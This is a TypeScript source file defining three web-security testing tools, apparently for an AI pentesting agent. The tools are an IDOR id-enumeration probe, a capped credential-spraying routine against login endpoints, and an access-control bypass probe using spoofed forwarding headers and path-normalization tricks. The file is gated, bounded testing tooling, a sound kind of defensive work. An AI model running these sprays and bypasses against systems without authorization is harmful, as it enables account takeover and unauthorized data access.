/*
 * Copyleft 🄯 2026 Germano Castanho
 * Software licensed under GNU GPL v3
 * No gods, no masters, no copyrights
 */

import type { Tool } from "./types.ts";
import { boundedPool, parseHttpUrl, probeRequest } from "./http.ts";

const MAX_IDS = 50;
const MAX_ATTEMPTS = 100;
const CONCURRENCY = 6;

/** Header tricks that a broken access-control layer may honor. */
const BYPASS_HEADERS: Array<{
  label: string;
  headers: Record<string, string>;
}> = [
  {
    label: "X-Forwarded-For: 127.0.0.1",
    headers: { "x-forwarded-for": "127.0.0.1" },
  },
  {
    label: "X-Forwarded-Host: localhost",
    headers: { "x-forwarded-host": "localhost" },
  },
  { label: "X-Real-IP: 127.0.0.1", headers: { "x-real-ip": "127.0.0.1" } },
  {
    label: "X-Originating-IP: 127.0.0.1",
    headers: { "x-originating-ip": "127.0.0.1" },
  },
  {
    label: "X-Custom-IP-Authorization: 127.0.0.1",
    headers: { "x-custom-ip-authorization": "127.0.0.1" },
  },
  { label: "X-Original-URL", headers: {} },
  { label: "X-Rewrite-URL", headers: {} },
];

/** Path mutations that may dodge a naive route-based auth check. */
function pathVariants(
  pathname: string,
): Array<{ label: string; path: string }> {
  const trimmed = pathname.replace(/\/+$/, "") || "/";
  return [
    { label: "trailing slash", path: `${trimmed}/` },
    { label: "trailing dot", path: `${trimmed}/.` },
    { label: "matrix ..;/", path: `${trimmed}/..;/` },
    { label: "double slash", path: `/${trimmed}`.replace(/^\/+/, "//") },
    { label: "%2e suffix", path: `${trimmed}%2e` },
    { label: "uppercase", path: trimmed.toUpperCase() },
  ];
}

/**
 * IDOR / broken-object-level-authorization probe. Enumerates a numeric object
 * reference across a range and reports which values return accessible
 * responses — a spread of 200s across ids you should not own signals IDOR.
 * Put `FUZZ` in the path or name a query `param` holding the id.
 */
export const idorProbe: Tool = {
  name: "idor_probe",
  description:
    "Enumerate an object id (in the path via FUZZ, or a query param) across a range and report which return accessible responses — signals IDOR. Active against the target.",
  risky: true,
  schema: {
    type: "object",
    properties: {
      url: {
        type: "string",
        description: "URL with `FUZZ` where the id goes, or a plain URL.",
      },
      param: {
        type: "string",
        description: "Query parameter holding the id, if not using FUZZ.",
      },
      start: { type: "number", description: "First id (default 1)." },
      count: {
        type: "number",
        description: `How many sequential ids to try (max ${MAX_IDS}).`,
      },
    },
    required: ["url"],
    additionalProperties: false,
  },

  async run(input) {
    const rawUrl = typeof input.url === "string" ? input.url : "";
    const usesFuzz = rawUrl.includes("FUZZ");
    const param = typeof input.param === "string" ? input.param : "";
    if (!usesFuzz && param === "") {
      return {
        content: "Provide `FUZZ` in the url or a query `param` holding the id.",
        isError: true,
      };
    }
    // Validate host once (scope guard reads `url`); FUZZ is substituted per id.
    if (!parseHttpUrl(usesFuzz ? rawUrl.replace("FUZZ", "1") : rawUrl)) {
      return { content: "Missing or malformed url.", isError: true };
    }

    const start = Number.isInteger(input.start) ? (input.start as number) : 1;
    const count = Math.min(
      Number.isInteger(input.count) ? (input.count as number) : 10,
      MAX_IDS,
    );
    const ids = Array.from({ length: count }, (_, i) => start + i);

    const results = await boundedPool(ids, CONCURRENCY, async (id) => {
      let target: URL;
      if (usesFuzz) {
        target = new URL(rawUrl.replace("FUZZ", String(id)));
      } else {
        target = new URL(rawUrl);
        target.searchParams.set(param, String(id));
      }
      const res = await probeRequest(target);
      return { id, status: res.status, len: res.body.length, err: res.error };
    });

    const accessible = results.filter((r) => r.status === 200 && !r.err);
    const lines = accessible.map((r) => `  [200] id=${r.id} — ${r.len}b`);
    return {
      content:
        `IDOR probe — ${count} ids from ${start}\n` +
        (accessible.length > 0
          ? `${lines.join("\n")}\n${accessible.length}/${count} accessible — verify these are not all meant to be public.`
          : "  No accessible objects in range."),
    };
  },
};

/**
 * Bounded credential spraying against a login endpoint. Tries a small matrix of
 * usernames × passwords (hard-capped at 100 attempts) and flags responses that
 * diverge from a known-bad baseline. Risky and state-touching — always gated,
 * and confirmation is expected before it runs.
 */
export const credentialSpray: Tool = {
  name: "credential_spray",
  description: `Bounded credential test against a login endpoint (max ${MAX_ATTEMPTS} attempts). Flags responses diverging from a failed-login baseline. Active and state-touching; requires approval.`,
  risky: true,
  schema: {
    type: "object",
    properties: {
      url: { type: "string", description: "Login endpoint URL." },
      usernames: {
        type: "array",
        items: { type: "string" },
        description: "Usernames to try.",
      },
      passwords: {
        type: "array",
        items: { type: "string" },
        description: "Passwords to try against each username.",
      },
      user_field: {
        type: "string",
        description: "Username field (default `username`).",
      },
      pass_field: {
        type: "string",
        description: "Password field (default `password`).",
      },
      json: {
        type: "boolean",
        description: "Send JSON instead of form-encoded (default false).",
      },
    },
    required: ["url", "usernames", "passwords"],
    additionalProperties: false,
  },

  async run(input) {
    const url = parseHttpUrl(input.url);
    if (!url) return { content: "Missing or malformed url.", isError: true };
    const users = Array.isArray(input.usernames)
      ? input.usernames.map(String)
      : [];
    const passwords = Array.isArray(input.passwords)
      ? input.passwords.map(String)
      : [];
    if (users.length === 0 || passwords.length === 0) {
      return {
        content: "Provide non-empty usernames and passwords.",
        isError: true,
      };
    }
    const userField =
      typeof input.user_field === "string" ? input.user_field : "username";
    const passField =
      typeof input.pass_field === "string" ? input.pass_field : "password";
    const asJson = input.json === true;

    const pairs: Array<{ u: string; p: string }> = [];
    for (const u of users) {
      for (const p of passwords) {
        if (pairs.length >= MAX_ATTEMPTS) break;
        pairs.push({ u, p });
      }
    }
    const capped = users.length * passwords.length > MAX_ATTEMPTS;

    const encode = (u: string, p: string): string =>
      asJson
        ? JSON.stringify({ [userField]: u, [passField]: p })
        : new URLSearchParams({ [userField]: u, [passField]: p }).toString();
    const contentType = asJson
      ? "application/json"
      : "application/x-www-form-urlencoded";

    // Baseline: an obviously-wrong credential to learn what failure looks like.
    const baseline = await probeRequest(url, {
      method: "POST",
      headers: { "content-type": contentType },
      body: encode("basilisk_nouser", "basilisk_nopass"),
    });

    const hits = await boundedPool(pairs, CONCURRENCY, async ({ u, p }) => {
      const res = await probeRequest(url, {
        method: "POST",
        headers: { "content-type": contentType },
        body: encode(u, p),
      });
      if (res.error) return null;
      const setCookie = res.headers.get("set-cookie");
      const diverges =
        res.status !== baseline.status ||
        Math.abs(res.body.length - baseline.body.length) > 48 ||
        (setCookie !== null && /session|token|auth/i.test(setCookie));
      return diverges
        ? `  [!] ${u}:${p} → status ${res.status}, ${res.body.length}b${setCookie ? " (Set-Cookie)" : ""}`
        : null;
    });

    const found = hits.filter((h): h is string => h !== null);
    return {
      content:
        `Credential spray on ${url.href} — ${pairs.length} attempts` +
        (capped ? ` (capped at ${MAX_ATTEMPTS})` : "") +
        `\n(baseline: status ${baseline.status}, ${baseline.body.length}b)\n` +
        (found.length > 0
          ? `${found.join("\n")}\nDivergent responses — verify as valid logins.`
          : "  No divergent responses."),
    };
  },
};

/** Whether a variant's status looks like it reached the protected resource. */
function looksBypassed(baseStatus: number, status: number): boolean {
  return (
    (baseStatus === 401 || baseStatus === 403) && status >= 200 && status < 300
  );
}

/**
 * Access-control bypass probe. Baselines a protected URL, then retries it with
 * spoofed forwarding headers, `X-Original-URL`/`X-Rewrite-URL` route overrides,
 * and path-normalization tricks, flagging any variant that turns a 401/403 into
 * a 2xx. Active against the target.
 */
export const authBypassProbe: Tool = {
  name: "auth_bypass_probe",
  description:
    "Probe a protected URL for access-control bypass: spoofed IP/forwarding headers, X-Original-URL/X-Rewrite-URL overrides, and path-normalization tricks that turn a 401/403 into a 2xx. Active against the target.",
  risky: true,
  schema: {
    type: "object",
    properties: {
      url: {
        type: "string",
        description: "Absolute URL of a resource that should require auth.",
      },
    },
    required: ["url"],
    additionalProperties: false,
  },

  async run(input) {
    const url = parseHttpUrl(input.url);
    if (!url) return { content: "Missing or malformed url.", isError: true };
    const base = await probeRequest(url);
    if (base.error) {
      return {
        content: `Baseline request failed: ${base.error}`,
        isError: true,
      };
    }
    if (base.status !== 401 && base.status !== 403) {
      return {
        content:
          `Baseline is HTTP ${base.status}, not 401/403 — the resource is not ` +
          `access-controlled as given, so there is nothing to bypass.`,
      };
    }

    const attempts: Array<{
      label: string;
      res: Promise<{ status: number; error?: string }>;
    }> = [];
    for (const h of BYPASS_HEADERS) {
      const headers =
        h.label === "X-Original-URL"
          ? { "x-original-url": url.pathname }
          : h.label === "X-Rewrite-URL"
            ? { "x-rewrite-url": url.pathname }
            : h.headers;
      attempts.push({ label: h.label, res: probeRequest(url, { headers }) });
    }
    for (const v of pathVariants(url.pathname)) {
      const variant = new URL(url.href);
      variant.pathname = v.path;
      attempts.push({ label: `path: ${v.label}`, res: probeRequest(variant) });
    }

    const lines: string[] = [];
    for (const a of attempts) {
      const res = await a.res;
      if (res.error) continue;
      if (looksBypassed(base.status, res.status)) {
        lines.push(`  [!] ${a.label} → HTTP ${res.status}`);
      }
    }

    return {
      content:
        `Auth-bypass probe on ${url.href} (baseline HTTP ${base.status})\n` +
        (lines.length > 0
          ? `${lines.join("\n")}\nBypass found — verify the response is the protected content.`
          : "  No bypass: every variant stayed denied."),
    };
  },
};
